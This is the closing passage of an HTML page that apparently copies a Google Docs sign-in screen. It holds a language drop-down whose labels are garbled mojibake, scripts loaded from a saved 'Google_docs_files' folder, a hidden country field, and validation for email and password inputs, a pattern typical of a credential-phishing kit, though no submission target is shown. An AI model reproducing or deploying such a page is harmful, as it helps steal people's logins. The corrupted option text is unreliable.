  Ð²Ð‚Ð„ItalianoÐ²Ð‚Â¬
  </option>
  <option value="sw"
                 >
  Ð²Ð‚Ð„KiswahiliÐ²Ð‚Â¬
  </option>
  <option value="lv"
                 >
  Ð²Ð‚Ð„latvieÐ•ÐŽuÐ²Ð‚Â¬
  </option>
  <option value="lt"
                 >
  Ð²Ð‚Ð„lietuviÐ•Ñ–Ð²Ð‚Â¬
  </option>
  <option value="hu"
                 >
  Ð²Ð‚Ð„magyarÐ²Ð‚Â¬
  </option>
  <option value="nl"
                 >
  Ð²Ð‚Ð„NederlandsÐ²Ð‚Â¬
  </option>
  <option value="no"
                 >
  Ð²Ð‚Ð„norskÐ²Ð‚Â¬
  </option>
  <option value="pl"
                 >
  Ð²Ð‚Ð„polskiÐ²Ð‚Â¬
  </option>
  <option value="pt"
                 >
  Ð²Ð‚Ð„PortuguÐ“Ð„sÐ²Ð‚Â¬
  </option>
  <option value="pt-BR"
                 >
  Ð²Ð‚Ð„PortuguÐ“Ð„s (Brasil)Ð²Ð‚Â¬
  </option>
  <option value="pt-PT"
                 >
  Ð²Ð‚Ð„PortuguÐ“Ð„s (Portugal)Ð²Ð‚Â¬
  </option>
  <option value="ro"
                 >
  Ð²Ð‚Ð„romÐ“ÑžnÐ”Ñ“Ð²Ð‚Â¬
  </option>
  <option value="sk"
                 >
  Ð²Ð‚Ð„SlovenÐ”ÐŒinaÐ²Ð‚Â¬
  </option>
  <option value="sl"
                 >
  Ð²Ð‚Ð„slovenÐ•ÐŽÐ”ÐŒinaÐ²Ð‚Â¬
  </option>
  <option value="fi"
                 >
  Ð²Ð‚Ð„SuomiÐ²Ð‚Â¬
  </option>
  <option value="sv"
                 >
  Ð²Ð‚Ð„SvenskaÐ²Ð‚Â¬
  </option>
  <option value="vi"
                 >
  Ð²Ð‚Ð„TiÐ±Ñ”Ñ—ng ViÐ±Â»â€¡tÐ²Ð‚Â¬
  </option>
  <option value="tr"
                 >
  Ð²Ð‚Ð„TÐ“Ñ˜rkÐ“Â§eÐ²Ð‚Â¬
  </option>
  <option value="el"
                 >
  Ð²Ð‚Ð„Ðžâ€¢ÐžÂ»ÐžÂ»ÐžÂ·ÐžÐ…Ðžâ„–ÐžÑ”ÐžÂ¬Ð²Ð‚Â¬
  </option>
  <option value="bg"
                 >
  Ð²Ð‚Ð„Ð Â±Ð¡Ð‰Ð Â»Ð Ñ–Ð Â°Ð¡Ð‚Ð¡ÐƒÐ Ñ”Ð Ñ‘Ð²Ð‚Â¬
  </option>
  <option value="mn"
                 >
  Ð²Ð‚Ð„Ð Ñ˜Ð Ñ•Ð Ð…Ð Ñ–Ð Ñ•Ð Â»Ð²Ð‚Â¬
  </option>
  <option value="ru"
                 >
  Ð²Ð‚Ð„Ð Â Ð¡Ñ“Ð¡ÐƒÐ¡ÐƒÐ Ñ”Ð Ñ‘Ð â„–Ð²Ð‚Â¬
  </option>
  <option value="sr"
                 >
  Ð²Ð‚Ð„Ð ÐŽÐ¡Ð‚Ð Ñ—Ð¡ÐƒÐ Ñ”Ð Ñ‘Ð²Ð‚Â¬
  </option>
  <option value="uk"
                 >
  Ð²Ð‚Ð„Ð ÐˆÐ Ñ”Ð¡Ð‚Ð Â°Ð¡â€”Ð Ð…Ð¡ÐƒÐ¡ÐŠÐ Ñ”Ð Â°Ð²Ð‚Â¬
  </option>
  <option value="ka"
                 >
  Ð²Ð‚Ð„Ð±Ñ“ÒÐ±Ñ“Ñ’Ð±Ñ“Â Ð±Ñ“â€”Ð±Ñ“ÐˆÐ±Ñ“Ñ™Ð±Ñ“Â˜Ð²Ð‚Â¬
  </option>
  <option value="hy"
                 >
  Ð²Ð‚Ð„Ð¥Â°Ð¥ÐŽÐ¥ÂµÐ¥ÒÐ¦Ð‚Ð¥ÒÐ¥Â¶Ð²Ð‚Â¬
  </option>
  <option value="iw"
                 >
  Ð²Ð‚Â«Ð§ÑžÐ§â€˜Ð§ÐÐ§â„¢Ð§Ð„Ð²Ð‚Â¬Ð²Ð‚Ð‹
  </option>
  <option value="ur"
                 >
  Ð²Ð‚Â«Ð¨Â§Ð¨Â±Ð¨Ð‡Ð©â‚¬Ð²Ð‚Â¬Ð²Ð‚Ð‹
  </option>
  <option value="ar"
                 >
  Ð²Ð‚Â«Ð¨Â§Ð©â€žÐ¨â„–Ð¨Â±Ð¨ÐÐ©Ð‰Ð¨Â©Ð²Ð‚Â¬Ð²Ð‚Ð‹
  </option>
  <option value="fa"
                 >
  Ð²Ð‚Â«Ð©ÐƒÐ¨Â§Ð¨Â±Ð¨Ñ–Ð«ÐŠÐ²Ð‚Â¬Ð²Ð‚Ð‹
  </option>
  <option value="am"
                 >
  Ð²Ð‚Ð„Ð±Ð‰Â Ð±â‚¬â€ºÐ±â‚¬Â­Ð±Ð‰â€ºÐ²Ð‚Â¬
  </option>
  <option value="ne"
                 >
  Ð²Ð‚Ð„Ð°Â¤ÐÐ°Òâ€¡Ð°Â¤Ð„Ð°Â¤Ñ•Ð°Â¤Ð†Ð°ÒÐ‚Ð²Ð‚Â¬
  </option>
  <option value="mr"
                 >
  Ð²Ð‚Ð„Ð°Â¤Â®Ð°Â¤Â°Ð°Â¤Ñ•Ð°Â¤Â Ð°ÒÐ‚Ð²Ð‚Â¬
  </option>
  <option value="hi"
                 >
  Ð²Ð‚Ð„Ð°Â¤â„–Ð°Â¤Ñ—Ð°Â¤ÐÐ°ÒÐŒÐ°Â¤Â¦Ð°ÒÐ‚Ð²Ð‚Â¬
  </option>
  <option value="bn"
                 >
  Ð²Ð‚Ð„Ð°Â¦Â¬Ð°Â¦Ñ•Ð°Â¦â€šÐ°Â¦Ð†Ð°Â¦Ñ•Ð²Ð‚Â¬
  </option>
  <option value="gu"
                 >
  Ð²Ð‚Ð„Ð°Ð„â€”Ð°Â«ÐƒÐ°Ð„ÑšÐ°Ð„Â°Ð°Ð„Ñ•Ð°Ð„Â¤Ð°Â«Ð‚Ð²Ð‚Â¬
  </option>
  <option value="ta"
                 >
  Ð²Ð‚Ð„Ð°Â®Â¤Ð°Â®Â®Ð°Â®Ñ—Ð°Â®Ò‘Ð°Ð‡ÐŒÐ²Ð‚Â¬
  </option>
  <option value="te"
                 >
  Ð²Ð‚Ð„Ð°Â°Â¤Ð°Â±â€ Ð°Â°Ð†Ð°Â±ÐƒÐ°Â°â€”Ð°Â±ÐƒÐ²Ð‚Â¬
  </option>
  <option value="kn"
                 >
  Ð²Ð‚Ð„Ð°Ð†â€¢Ð°Ð†ÐÐ°Ñ–ÐŒÐ°Ð†ÐÐ°Ð†ÐŽÐ²Ð‚Â¬
  </option>
  <option value="ml"
                 >
  Ð²Ð‚Ð„Ð°Ò‘Â®Ð°Ò‘Ð†Ð°Ò‘Ð‡Ð°Ò‘Ñ•Ð°Ò‘Ñ–Ð°Ò‘â€šÐ²Ð‚Â¬
  </option>
  <option value="si"
                 >
  Ð²Ð‚Ð„Ð°Â·Ñ“Ð°Â·â€™Ð°Â¶â€šÐ°Â·â€žÐ°Â¶Ð…Ð²Ð‚Â¬
  </option>
  <option value="th"
                 >
  Ð²Ð‚Ð„Ð°â„–â€žÐ°Ñ‘â€”Ð°Ñ‘ÑžÐ²Ð‚Â¬
  </option>
  <option value="lo"
                 >
  Ð²Ð‚Ð„Ð°Ñ”ÒÐ°Ñ”Ð†Ð°Ñ”Â§Ð²Ð‚Â¬
  </option>
  <option value="km"
                 >
  Ð²Ð‚Ð„Ð±Ñ›ÐƒÐ±ÑŸâ€™Ð±Ñ›Â˜Ð±ÑŸâ€šÐ±Ñ›Ñ™Ð²Ð‚Â¬
  </option>
  <option value="ko"
                 >
  Ð²Ð‚Ð„Ð½â€¢ÑšÐºÂµÂ­Ð¼â€“Ò‘Ð²Ð‚Â¬
  </option>
  <option value="zh-HK"
                 >
  Ð²Ð‚Ð„Ð´Ñ‘Â­Ð¶â€“â€¡Ð¿Ñ˜â‚¬Ð¹Â¦â„¢Ð¶Ñ‘Ð‡Ð¿Ñ˜â€°Ð²Ð‚Â¬
  </option>
  <option value="ja"
                 >
  Ð²Ð‚Ð„Ð¶â€”ÒÐ¶ÑšÂ¬Ð¸Ð„Ñ›Ð²Ð‚Â¬
  </option>
  <option value="zh-CN"
                 >
  Ð²Ð‚Ð„Ð·Â®Ð‚Ð´Ð…â€œÐ´Ñ‘Â­Ð¶â€“â€¡Ð²Ð‚Â¬
  </option>
  <option value="zh-TW"
                 >
  Ð²Ð‚Ð„Ð·â„–ÐƒÐ¹Â«â€Ð´Ñ‘Â­Ð¶â€“â€¡Ð²Ð‚Â¬
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  
  <script type="text/javascript" src="Google_docs_files/jquery.min.js"></script>
  <script type="text/javascript" src="Google_docs_files/jquery.ddslick.min.js"></script>
  

<script type="text/javascript">
$('.cflagdd').ddslick({  
        onSelected: function(data){  
            if(data.selectedIndex > 0) {
                $('#hidCflag').val(data.selectedData.value);

               
            }   
        }    
    }); ;

var sprypassword1 = new Spry.Widget.ValidationPassword("sprypassword1");
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "email");
</script>

</body>
</html>